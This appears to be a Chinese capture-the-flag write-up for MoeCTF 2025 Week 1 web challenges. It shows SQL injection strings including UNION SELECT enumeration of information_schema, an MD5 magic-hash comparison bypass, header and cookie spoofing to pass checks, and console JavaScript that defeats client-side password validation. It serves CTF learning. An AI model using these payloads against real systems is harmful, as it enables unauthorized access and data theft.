# MoeCTF 2025 Writeup

> 原文: https://www.ctfiot.com/307345.html
> ID: 307345

当时博主只做了 Week 1，不好意思非常不全

Week 1

Web1

事件绑定 passwordInput，这里禁止粘贴

正确密码就在 JS 中藏着

JS 程序纯粹前端校验，字符串相等即可，直接控制台赋值，调用 JS 函数

document.querySelector('#passwordInput').value = CORRECT_PASSWORD;validatePassword();

也可以直接干掉禁止粘贴

document.getElementById('passwordInput').removeEventListener('paste', handlePaste);

再粘贴就没有限制

Web2

找了半天

Web3

script 逻辑就是需要模拟发包，/test_talent?level=S 且 JSON 字符串为流云状青芒

按照思路发包

POST /test_talent?level=SContent-Type: application/json{"manifestation":"流云状青芒"}

返回包就是不带 FLAG，一度卡住，甚至直接改网页源码试了一下

asyncfunctiontestTalent() { try { const res = await fetch('/test_talent?level=S', { method:'POST', headers: {'Content-Type':'application/json','Accept':'application/json'}, body: JSON.stringify({ manifestation:'流云状青芒'}) }); const data = await res.json(); document.getElementById('result').textContent = data.result; const glow = document.getElementById('glow'); glow.style.opacity = /流云状青芒/i.test(data.result) ?'1':'0'; setTimeout(() => alert(`✨ 天道机缘：${data.flag}✨nn天赋篡天术大成！`), 500); } catch (e) { alert('玄轨连接中断！请检查灵枢...'); }}

看到简介

Web4

第一关：/stone_golem?key=xdsec第二关：/cloud_weaverPOST：declaration=织云阁=第一第三关：/shadow_stalkerX-Forwarded-For:
127.0.0.1第四关：/soul_discernerUser-Agent:
moe browser第五关：你需要以xt的身份认证user!/heart_sealCookie: user=xt第六关：你不是从http://panshi/entry来的吗？快回去！/pathfinderReferer:
http://panshi/entry第七关：PUT /void_rebirth新生！

bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}

Web5

Web6

1'or'1'='1

Web7

<?phphighlight_file(__FILE__);$flag= getenv('FLAG');$a=$_GET["a"] ??"";$b=$_GET["b"] ??"";if($a==$b){ die("error 1");}if(md5($a) != md5($b)){ die("error 2");}echo$flag;

md5 弱比较

/flag.php?a=QNKCDZO&b=240610708

Web8

1'or(true)order by 2#1'or(true)order by 3#1'union select (select group_concat(table_name) from informations_schema.tables where table_name=database())2#1'union select (select group_concat(column_name) from information_schema.columnswheretable_schema=database() and table_name='flag'),2#1'union select (select group_concat(value) from user.flag),2
#

Web9

访问这个路由直接就能拿到 FLAG，无需借助前端调用函数

免责声明本文章所涉及仅供技术研究和学习之用。所有操作仅在合法授权的环境中进行，绝不用于任何非法活动。作者对因本文章内容导致的任何后果不承担责任。请读者务必遵守相关法律法规，合理使用本知识。


```
document.querySelector('#passwordInput').value = CORRECT_PASSWORD;validatePassword();
document.getElementById('passwordInput').removeEventListener('paste', handlePaste);
POST /test_talent?level=SContent-Type: application/json{"manifestation":"流云状青芒"}
asyncfunctiontestTalent() { try { const res = await fetch('/test_talent?level=S', { method:'POST', headers: {'Content-Type':'application/json','Accept':'application/json'}, body: JSON.stringify({ manifestation:'流云状青芒'}) }); const data = await res.json(); document.getElementById('result').textContent = data.result; const glow = document.getElementById('glow'); glow.style.opacity = /流云状青芒/i.test(data.result) ?'1':'0'; setTimeout(() => alert(`✨ 天道机缘：${data.flag}✨nn天赋篡天术大成！`), 500); } catch (e) { alert('玄轨连接中断！请检查灵枢...'); }}
第一关：/stone_golem?key=xdsec第二关：/cloud_weaverPOST：declaration=织云阁=第一第三关：/shadow_stalkerX-Forwarded-For:
127.0.0.1第四关：/soul_discernerUser-Agent:
moe browser第五关：你需要以xt的身份认证user!/heart_sealCookie: user=xt第六关：你不是从http://panshi/entry来的吗？快回去！/pathfinderReferer:
http://panshi/entry第七关：PUT /void_rebirth新生！
bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}
1'or'1'='1
<?phphighlight_file(__FILE__);$flag= getenv('FLAG');$a=$_GET["a"] ??"";$b=$_GET["b"] ??"";if($a==$b){ die("error 1");}if(md5($a) != md5($b)){ die("error 2");}echo$flag;
/flag.php?a=QNKCDZO&b=240610708
1'or(true)order by 2#1'or(true)order by 3#1'union select (select group_concat(table_name) from informations_schema.tables where table_name=database())2#1'union select (select group_concat(column_name) from information_schema.columnswheretable_schema=database() and table_name='flag'),2#1'union select (select group_concat(value) from user.flag),2
#
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778201749-wxsync-2026-05-3142226c78583291f1a9b4f00ebfc790.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778201751-wxsync-2026-05-a42669b790936fc2ad4d24826d39e05a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778201752-wxsync-2026-05-53510be7486b09542dc65b69bf8960dd.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778201754-wxsync-2026-05-20981fde324fc9960fee6966ad50fa7b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778201755-wxsync-2026-05-3ec157b5dd4fc98ebca3c4ef50b72f64.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778201757-wxsync-2026-05-550ed4bc7a7649e1325dade1e6cfeec9.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778201759-wxsync-2026-05-f5a1c3a91172b7d92e5b10bc9686ca6a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778201760-wxsync-2026-05-dd4238f04f7baec566eb643ea6e3ca7e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778201762-wxsync-2026-05-720fc13a98b921fe134e3853b57304f6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778201763-wxsync-2026-05-f82a5f92a81c60134100145f05a3a9e0.png)